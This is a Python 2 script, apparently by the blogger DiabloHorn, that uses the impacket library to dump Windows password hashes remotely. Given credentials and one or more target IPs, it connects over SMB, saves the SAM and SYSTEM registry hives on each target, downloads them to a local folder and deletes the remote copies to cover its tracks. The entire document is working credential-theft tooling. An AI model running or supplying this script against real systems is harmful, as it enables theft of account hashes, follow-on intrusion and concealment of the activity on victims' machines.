#!/usr/bin/env python

#DiabloHorn http://diablohorn.wordpress.com

import sys
import getopt
import os
from impacket.dcerpc.transport import DCERPCTransport
from impacket.smbconnection import *
from impacket.dcerpc import transport, dcerpc, winreg

_domain = None
_dcerpctransport = None
_localdumplocation = None
_remotebaselocation = 'windows\\system32\\'

def getloginsession(ip, d, u, p):
    s = SMBConnection(ip, ip)
    if _domain is None:
        if s.login(u, p):
            return s
    else:
        if s.login(u, p, domain=d):
            return s
    return None

def logout(conn):
    if isinstance(conn, SMBConnection):
        conn.logoff()

    if isinstance(conn,DCERPCTransport):
        conn.disconnect()

def showhelp():
    print "[*] DiabloHorn http://diablohorn.wordpress.com"
    print "[*] Procesless remote hash dumper using the remote registry"
    print "[*] %s -t <target> -u <[domain\]username> -p <password> -l <location to save>" % sys.argv[0]
    print "[*] target - use file: syntax to specify a file with multiple ips"
    print "[*] h - for this menu"
    print "[*] examples: "
    print "[*] %s -t 1.2.3.4 -u administrator -p password -l /tmp/" % sys.argv[0]
    print "[*] %s -t 1.2.3.4 -u domain\\administrator -p password -l /tmp/" % sys.argv[0]
    print "[*] %s -t file:/tmp/targets.txt -u administrator -p password -l /tmp/" % sys.argv[0]
    sys.exit(0)

def getregistryconnection(sconn, ip):
    global _dcerpctransport
    #reuse the existing smb connection for dcerpc
    _dcerpctransport = transport.SMBTransport(ip, 445, 'winreg', smb_connection=sconn)
    _dcerpctransport.connect()
    dce = _dcerpctransport.DCERPC_class(_dcerpctransport)
    dce.bind(winreg.MSRPC_UUID_WINREG)
    return winreg.DCERPCWinReg(dce)

def savefile_callback(data):
    f = open(_localdumplocation+'tempfile', 'ab+')
    f.write(data)
    f.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        showhelp()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:u:p:l:h")
    except getopt.GetoptError, err:
        print str(err)
        sys.exit(0)

    targets = list()
    domain = None
    username = None
    password = None
    _localdumplocation = None

    for o, a in opts:
        if o == "-h":
            showhelp()
        elif o == "-t":
            targetfilename = a.split('file:')
            if len(targetfilename) == 1:
                targets.append(a)
            else:
                with open(targetfilename[1]) as f:
                    #avoid assigning reference
                    targets = list(f.readlines())
                f.close()
        elif o == "-u":
            domainname = a.split('\\')
            if len(domainname) == 1:
                username = a
            else:
                domain = domainname[0]
                username = domainname[1]
        elif o == "-p":
            password = a
        elif o == "-l":
            if not a.endswith('/'):
                a = a + '/'
            _localdumplocation = a
        else:
            showhelp()


    #prepared to launch
    print "[*] targets %i" % len(targets)
    print "[*] domain %s" % domain
    print "[*] username %s" % username
    print "[*] password %s" % password

    for victim in targets:
        victim = victim.rstrip()
        remote_samsavename = victim+".s"
        remote_systemsavename = victim+".y"
        samfile = _remotebaselocation+remote_samsavename
        systemfile = _remotebaselocation+remote_systemsavename

        print "[*] accessing %s" % victim
        s = getloginsession(victim, domain, username, password)
        registryconnection = getregistryconnection(s, victim)
        hklm_open = registryconnection.openHKLM()
        hklm_open_chandle = hklm_open.get_context_handle()
        hklm_keyopen_sam = registryconnection.regOpenKey(hklm_open_chandle, "SAM", winreg.KEY_ALL_ACCESS)
        hklm_keyopen_system = registryconnection.regOpenKey(hklm_open_chandle, "SYSTEM", winreg.KEY_ALL_ACCESS)
        hklm_keyopen_sam_chandle = hklm_keyopen_sam.get_context_handle()
        hklm_keyopen_system_chandle = hklm_keyopen_system.get_context_handle()
        registryconnection.regSaveKey(hklm_keyopen_sam_chandle,remote_samsavename)
        registryconnection.regSaveKey(hklm_keyopen_system_chandle,remote_systemsavename)
        logout(_dcerpctransport)
        #get the sam
        s.getFile('C$', samfile, savefile_callback)
        s.deleteFile('C$',samfile)
        os.rename(_localdumplocation+'tempfile',_localdumplocation+remote_samsavename)
        print "[*] saved sam %s" % _localdumplocation+remote_samsavename
        #get the system
        s.getFile('C$', systemfile, savefile_callback)
        s.deleteFile('C$',systemfile)
        os.rename(_localdumplocation+'tempfile',_localdumplocation+remote_systemsavename)
        print "[*] saved system %s" % _localdumplocation+remote_systemsavename
        logout(s)


